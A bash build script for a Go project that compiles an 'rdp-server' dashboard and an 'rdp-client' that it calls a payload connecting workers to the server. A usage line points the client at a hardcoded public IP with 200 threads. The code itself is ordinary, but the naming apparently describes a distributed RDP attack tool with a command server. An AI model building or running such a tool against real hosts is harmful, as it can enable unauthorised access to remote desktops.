#!/bin/bash

# Exit on error
set -e

# Get the project root directory
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )/.." &> /dev/null && pwd )"

echo "Changing to project root: $DIR"
cd "$DIR"

echo "Creating bin directory..."
mkdir -p bin

echo "Building server..."
go build -ldflags "-s -w" -tags sqlite_omit_load_extension -o bin/rdp-server ./server/cmd/server

echo "Building client..."
go build -ldflags "-s -w" -o bin/rdp-client ./client/cmd/client

echo "Build complete."
echo ""
echo "Available executables:"
echo "  bin/rdp-server         - Server/Dashboard component with web interface"
echo "  bin/rdp-client         - Client payload that connects workers to server"
echo ""
echo "Usage examples:"
echo "  ./bin/rdp-server                           # Start server/dashboard on port 8080"
echo "  ./bin/rdp-client -server=84.32.70.197:8080 -threads=200  # Connect client to server"
